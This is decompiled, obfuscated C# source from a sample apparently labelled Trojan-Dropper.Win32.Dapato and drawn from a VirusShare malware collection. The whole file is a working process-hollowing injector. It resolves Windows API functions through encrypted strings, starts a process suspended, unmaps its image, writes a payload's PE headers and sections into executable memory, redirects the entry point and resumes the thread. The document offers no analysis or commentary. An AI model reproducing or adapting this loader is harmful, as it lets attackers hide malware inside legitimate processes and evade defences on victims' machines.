// Decompiled with JetBrains decompiler
// Type: ñjÿ1ªÉ
// Assembly: WØ4aø, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DB118F13-581C-4010-ABFF-E6DC7A5D5FFB
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Dropper.Win32.Dapato.baot-a7d9a67252a43e501f380f8743100ba9ef058b359ad6ff364999139604952822.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;

[StandardModule]
public sealed class ñjÿ1ªÉ
{
  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string ÏªP8ýp4FûoÚºétØ5µMbÔNîëºËe9MÌå0Rj);

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr GetProcAddress(
    IntPtr sòGÆ5ºµÂe1JæCªÞƒ3nµÙtFî2ÉºiêS,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

  public static µ5BõyÞZ ÕeFkÈòª<µ5BõyÞZ>(string YgíÀµmØBƒ4, string ÖkºçÆªR3) => (µ5BõyÞZ) Marshal.GetDelegateForFunctionPointer(ñjÿ1ªÉ.GetProcAddress(ñjÿ1ªÉ.LoadLibraryA(ref YgíÀµmØBƒ4), ref ÖkºçÆªR3), typeof (µ5BõyÞZ));

  public static void Æaƒw7(byte[] ÒªíÞaºã, string ãµYÆû6)
  {
    ñjÿ1ªÉ.qÿÆ6ªê qÿÆ6ªê = ñjÿ1ªÉ.ÕeFkÈòª<ñjÿ1ªÉ.qÿÆ6ªê>(Qê5ÄwµGsÝëµ2õ8.ð2µÆKyªÎGo5á3sd4ýÇPªXµ("3+xcxaHP8I1jtb2uxYeYxQ==", "Yk9"), Qê5ÄwµGsÝëµ2õ8.ð2µÆKyªÎGo5á3sd4ýÇPªXµ("qfgLN9oxhKyct/n/EFW6TQ==", "Zo5"));
    ñjÿ1ªÉ.ZÊñaµÃ7 zêñaµÃ7 = ñjÿ1ªÉ.ÕeFkÈòª<ñjÿ1ªÉ.ZÊñaµÃ7>(Qê5ÄwµGsÝëµ2õ8.ð2µÆKyªÎGo5á3sd4ýÇPªXµ("EpGxqoYxn2cFr2EWoo0m9g==", "Cd73"), Qê5ÄwµGsÝëµ2õ8.ð2µÆKyªÎGo5á3sd4ýÇPªXµ("CKSPjClOS+IyBcUkTBlnXBa4cpkMRpoFZK7+3zbtbvk=", "Lo1c"));
    ñjÿ1ªÉ.o6ªöèºÀy7B o6ªöèºÀy7B = ñjÿ1ªÉ.ÕeFkÈòª<ñjÿ1ªÉ.o6ªöèºÀy7B>(Qê5ÄwµGsÝëµ2õ8.ð2µÆKyªÎGo5á3sd4ýÇPªXµ("L+TRU5WGHBSbkOwbB6uzPQ==", "So1d"), Qê5ÄwµGsÝëµ2õ8.ð2µÆKyªÎGo5á3sd4ýÇPªXµ("XdOoeSOCvQ0CfXeiFWI1ydO6LxEGSzmIJdTZWWu6Y28=", "z8RD"));
    ñjÿ1ªÉ.ªpçÛpéLº ªpçÛpéLº = ñjÿ1ªÉ.ÕeFkÈòª<ñjÿ1ªÉ.ªpçÛpéLº>(Qê5ÄwµGsÝëµ2õ8.ð2µÆKyªÎGo5á3sd4ýÇPªXµ("fSWNXlX3MyjVVHdfH3+IbA==", "p5S9"), Qê5ÄwµGsÝëµ2õ8.ð2µÆKyªÎGo5á3sd4ýÇPªXµ("Xqb4AgaHMTyKJ66p3dzx1n9Q4cBXIF/TWSHlYxXR6Hw=", "Gs"));
    ñjÿ1ªÉ.àªNfÿ àªNfÿ1 = ñjÿ1ªÉ.ÕeFkÈòª<ñjÿ1ªÉ.àªNfÿ>(Qê5ÄwµGsÝëµ2õ8.ð2µÆKyªÎGo5á3sd4ýÇPªXµ("+HSdNQ57QqY3XgkqZoVJQA==", "Xe6w"), Qê5ÄwµGsÝëµ2õ8.ð2µÆKyªÎGo5á3sd4ýÇPªXµ("Ijx6mMwAXEfIYzvy2BLgLg==", "y9C"));
    ñjÿ1ªÉ.ƒwaµÃ7 ƒwaµÃ7_1 = ñjÿ1ªÉ.ÕeFkÈòª<ñjÿ1ªÉ.ƒwaµÃ7>(Qê5ÄwµGsÝëµ2õ8.ð2µÆKyªÎGo5á3sd4ýÇPªXµ("daKjqXT8cvNsePxmm0yAqQ==", "k0E"), Qê5ÄwµGsÝëµ2õ8.ð2µÆKyªÎGo5á3sd4ýÇPªXµ("4jOY0X47TWHLLxuctRpnSTV0DYO8/pizfPHbER5Baa0=", "Lg2j"));
    ñjÿ1ªÉ.Pâª4µw3î pâª4µw3î = ñjÿ1ªÉ.ÕeFkÈòª<ñjÿ1ªÉ.Pâª4µw3î>(Qê5ÄwµGsÝëµ2õ8.ð2µÆKyªÎGo5á3sd4ýÇPªXµ("IWmZnLxzLsNzRNlWKgId8Q==", "Ma"), Qê5ÄwµGsÝëµ2õ8.ð2µÆKyªÎGo5á3sd4ýÇPªXµ("tpLRkwDDOvOcJu26UMZAfeU60YfgyGuZRCvUpVfrANQ=", "Ao"));
    ñjÿ1ªÉ.aµrÃµå aµrÃµå = ñjÿ1ªÉ.ÕeFkÈòª<ñjÿ1ªÉ.aµrÃµå>(Qê5ÄwµGsÝëµ2õ8.ð2µÆKyªÎGo5á3sd4ýÇPªXµ("IqIov4GRYt9qW4vw+4Ua6A==", "i8D"), Qê5ÄwµGsÝëµ2õ8.ð2µÆKyªÎGo5á3sd4ýÇPªXµ("m2TLesH5aUri7la0RXvrDg==", "Nq"));
    int int32 = BitConverter.ToInt32(ÒªíÞaºã, 60);
    int int16 = (int) BitConverter.ToInt16(ÒªíÞaºã, checked (int32 + 6));
    IntPtr num1 = new IntPtr(BitConverter.ToInt32(ÒªíÞaºã, checked (int32 + 84)));
    byte[] Fþº7qÚªkÎÿM3ØXÅ9tõµºyÑýS2w4RÀªð = new byte[68];
    IntPtr[] y9æGµÆ0àªxµà9AÈú1SØªwºKácÆ = new IntPtr[4];
    IntPtr num2;
    if (!qÿÆ6ªê((string) null, new StringBuilder(ãµYÆû6), num2, num2, false, 4, num2, (string) null, Fþº7qÚªkÎÿM3ØXÅ9tõµºyÑýS2w4RÀªð, y9æGµÆ0àªxµà9AÈú1SØªwºKácÆ))
      return;
    uint[] numArray = new uint[179];
    numArray[0] = 65538U;
    IntPtr ªmËî4Tëºe6LÅgÏaÀZ4áªÞG;
    IntPtr SàÜ8ªqÆäNjµ4Zºø7sßý;
    if (zêñaµÃ7(y9æGµÆ0àªxµà9AÈú1SØªwºKácÆ[1], numArray) && ªpçÛpéLº(y9æGµÆ0àªxµà9AÈú1SØªwºKácÆ[0], new IntPtr(checked ((long) numArray[41] + 8L)), ref ªmËî4Tëºe6LÅgÏaÀZ4áªÞG, new IntPtr(4), ref SàÜ8ªqÆäNjµ4Zºø7sßý) && o6ªöèºÀy7B(y9æGµÆ0àªxµà9AÈú1SØªwºKácÆ[0], ªmËî4Tëºe6LÅgÏaÀZ4áªÞG) == 0U)
    {
      ñjÿ1ªÉ.àªNfÿ àªNfÿ2 = àªNfÿ1;
      IntPtr ÆaºòF6Wµñ7dÍƒSÐqª1Pµë2oÞe3fÊRÿº38îµZkÄDªwáÂ1 = y9æGµÆ0àªxµà9AÈú1SØªwºKácÆ[0];
      IntPtr num3 = new IntPtr(BitConverter.ToInt32(ÒªíÞaºã, checked (int32 + 52)));
      IntPtr ªbåÌE5ÊðZn9µwCº4øßÝþ8zºRJµæ3SØbµ6ZªôÐzx8áËH = num3;
      IntPtr num4 = new IntPtr(BitConverter.ToInt32(ÒªíÞaºã, checked (int32 + 80)));
      int µk1ƒSÀ4ºøHÊjðÖnÜCý = (int) checked ((uint) (int) num4);
      IntPtr num5 = àªNfÿ2(ÆaºòF6Wµñ7dÍƒSÐqª1Pµë2oÞe3fÊRÿº38îµZkÄDªwáÂ1, ªbåÌE5ÊðZn9µwCº4øßÝþ8zºRJµæ3SØbµ6ZªôÐzx8áËH, (uint) µk1ƒSÀ4ºøHÊjðÖnÜCý, 12288U, 64U);
      ñjÿ1ªÉ.ƒwaµÃ7 ƒwaµÃ7_2 = ƒwaµÃ7_1;
      IntPtr Aª6Æök9dºæMÜnàFµÓ54QµsçÍðnµ6WÏÛ8Hƒqª1 = y9æGµÆ0àªxµà9AÈú1SØªwºKácÆ[0];
      IntPtr LgºØÿ2ù5ÊaªFSµýÁc3àöcªÝ3ZµæÆ9De1 = num5;
      byte[] TØæaª8µ9SËmå6èoºÄRFþº7qÚªk1 = ÒªíÞaºã;
      int ª5éfPÅçµØH6gQú2ÆjåÔSµ5ê1 = (int) checked ((uint) (int) num1);
      int num6 = (int) SàÜ8ªqÆäNjµ4Zºø7sßý;
      ref int local1 = ref num6;
      int num7 = ƒwaµÃ7_2(Aª6Æök9dºæMÜnàFµÓ54QµsçÍðnµ6WÏÛ8Hƒqª1, LgºØÿ2ù5ÊaªFSµýÁc3àöcªÝ3ZµæÆ9De1, TØæaª8µ9SËmå6èoºÄRFþº7qÚªk1, (uint) ª5éfPÅçµØH6gQú2ÆjåÔSµ5ê1, out local1) ? 1 : 0;
      IntPtr num8 = (IntPtr) num6;
      bool flag = num7 != 0;
      int num9 = checked (int16 - 1);
      int num10 = 0;
      while (num10 <= num9)
      {
        int[] dst1 = new int[10];
        Buffer.BlockCopy((Array) ÒªíÞaºã, checked (int32 + 248 + num10 * 40), (Array) dst1, 0, 40);
        byte[] dst2 = new byte[checked (dst1[4] - 1 + 1)];
        Buffer.BlockCopy((Array) ÒªíÞaºã, dst1[5], (Array) dst2, 0, dst2.Length);
        ñjÿ1ªÉ.ƒwaµÃ7 ƒwaµÃ7_3 = ƒwaµÃ7_1;
        IntPtr Aª6Æök9dºæMÜnàFµÓ54QµsçÍðnµ6WÏÛ8Hƒqª2 = y9æGµÆ0àªxµà9AÈú1SØªwºKácÆ[0];
        num4 = new IntPtr(checked (num5.ToInt64() + (long) dst1[3]));
        IntPtr LgºØÿ2ù5ÊaªFSµýÁc3àöcªÝ3ZµæÆ9De2 = num4;
        byte[] TØæaª8µ9SËmå6èoºÄRFþº7qÚªk2 = dst2;
        num3 = new IntPtr(dst2.Length);
        int ª5éfPÅçµØH6gQú2ÆjåÔSµ5ê2 = (int) checked ((uint) (int) num3);
        int num11 = (int) num8;
        ref int local2 = ref num11;
        int num12 = ƒwaµÃ7_3(Aª6Æök9dºæMÜnàFµÓ54QµsçÍðnµ6WÏÛ8Hƒqª2, LgºØÿ2ù5ÊaªFSµýÁc3àöcªÝ3ZµæÆ9De2, TØæaª8µ9SËmå6èoºÄRFþº7qÚªk2, (uint) ª5éfPÅçµØH6gQú2ÆjåÔSµ5ê2, out local2) ? 1 : 0;
        num8 = (IntPtr) num11;
        flag = num12 != 0;
        checked { ++num10; }
      }
      ñjÿ1ªÉ.ƒwaµÃ7 ƒwaµÃ7_4 = ƒwaµÃ7_1;
      IntPtr Aª6Æök9dºæMÜnàFµÓ54QµsçÍðnµ6WÏÛ8Hƒqª3 = y9æGµÆ0àªxµà9AÈú1SØªwºKácÆ[0];
      num4 = new IntPtr(checked ((long) numArray[41] + 8L));
      IntPtr LgºØÿ2ù5ÊaªFSµýÁc3àöcªÝ3ZµæÆ9De3 = num4;
      byte[] bytes = BitConverter.GetBytes(num5.ToInt64());
      num3 = new IntPtr(4);
      int ª5éfPÅçµØH6gQú2ÆjåÔSµ5ê3 = (int) checked ((uint) (int) num3);
      int num13 = (int) num8;
      ref int local3 = ref num13;
      int num14 = ƒwaµÃ7_4(Aª6Æök9dºæMÜnàFµÓ54QµsçÍðnµ6WÏÛ8Hƒqª3, LgºØÿ2ù5ÊaªFSµýÁc3àöcªÝ3ZµæÆ9De3, bytes, (uint) ª5éfPÅçµØH6gQú2ÆjåÔSµ5ê3, out local3) ? 1 : 0;
      IntPtr num15 = (IntPtr) num13;
      flag = num14 != 0;
      numArray[44] = checked ((uint) (num5.ToInt32() + BitConverter.ToInt32(ÒªíÞaºã, int32 + 40)));
      int num16 = pâª4µw3î(y9æGµÆ0àªxµà9AÈú1SØªwºKácÆ[1], numArray) ? 1 : 0;
    }
    int num17 = aµrÃµå(y9æGµÆ0àªxµà9AÈú1SØªwºKácÆ[1]);
  }

  [SuppressUnmanagedCodeSecurity]
  [return: MarshalAs(UnmanagedType.Bool)]
  public delegate bool qÿÆ6ªê(
    string rÃµå6ALbâÖª7oºÙfåRÜ4µ8º,
    StringBuilder iÇâG8ªÚµS7sí1ògµù1Cß,
    IntPtr fåRÜ4µ8ºÕƒXaÉf4Dâº0ÇñyµZÆn,
    IntPtr õÙF5µk7rñªÌ7NïªgàGÃy4µ9ør,
    [MarshalAs(UnmanagedType.Bool)] bool æ1ZÐjº2ªxâÚEë7WÑeµkØ6µMúSXbÞ5æª3ÁºërA,
    int ªðPw6ÍZµãy9ÛEµºÕƒ,
    IntPtr ªpçK8ÎqT6Øµÿ7fäºNÔÅáª7Mqi9HµÈóìÖº,
    string µnÝEå2oãLª0ÞXÀñdº7qîº3MÛáRkjºï8CÆ3ÑgBµ,
    byte[] Fþº7qÚªkÎÿM3ØXÅ9tõµºyÑýS2w4RÀªð,
    IntPtr[] y9æGµÆ0àªxµà9AÈú1SØªwºKácÆ);

  [return: MarshalAs(UnmanagedType.Bool)]
  public delegate bool ZÊñaµÃ7(IntPtr µÊ1ãgYBãµYØ8q6rºBÜçò, uint[] ctxt);

  public delegate uint o6ªöèºÀy7B(
    IntPtr º1êÇmRýªz7HÁg2ÖGñºWÔkâª8ƒ,
    IntPtr ì0HcªÅBºÏ9þzéjµÆ6QF1îfåRÜ4µ8º);

  [return: MarshalAs(UnmanagedType.Bool)]
  public delegate bool ªpçÛpéLº(
    IntPtr Î3ªTàmmëªÍJ,
    IntPtr k3ÀåµLÔðDªe8X4ímÇºaªÆMÝå9gµoP0ªõÆ6ÈXç,
    ref IntPtr ªmËî4Tëºe6LÅgÏaÀZ4áªÞG,
    IntPtr SÄôtª0cPºæ3SØbµ6ZªôÐzx8áËH,
    ref IntPtr SàÜ8ªqÆäNjµ4Zºø7sßý);

  public delegate int aµrÃµå(IntPtr ªù7ÐCnÄ0föºP6µƒNtñ7µÅÿ6ÎªD);

  public delegate IntPtr àªNfÿ(
    IntPtr ÆaºòF6Wµñ7dÍƒSÐqª1Pµë2oÞe3fÊRÿº38îµZkÄDªwáÂ1,
    IntPtr ªbåÌE5ÊðZn9µwCº4øßÝþ8zºRJµæ3SØbµ6ZªôÐzx8áËH,
    uint µk1ƒSÀ4ºøHÊjðÖnÜCý,
    uint Þnå4Jµ7NÍºûrùg3ÚMªXÇwº8wºÍ3èEé2ªjPÞBøeÌµ1,
    uint qªBô3Ó1ØµAéop4SÌºìQü2zÇªÐæqº9ZÝÅ);

  public delegate bool ƒwaµÃ7(
    IntPtr Aª6Æök9dºæMÜnàFµÓ54QµsçÍðnµ6WÏÛ8Hƒqª,
    IntPtr LgºØÿ2ù5ÊaªFSµýÁc3àöcªÝ3ZµæÆ9De,
    byte[] TØæaª8µ9SËmå6èoºÄRFþº7qÚªk,
    uint ª5éfPÅçµØH6gQú2ÆjåÔSµ5ê,
    out int lpNumberOfBytesWritten);

  [return: MarshalAs(UnmanagedType.Bool)]
  public delegate bool Pâª4µw3î(
    IntPtr äºAÆ0f8íªkÉPjªä8TÂµ3tßëCWÃ0áº,
    uint[] Þ4ñfµY6qXâÇªº0gªÜ3úgRýµÚE2eiêNºÒ);
}
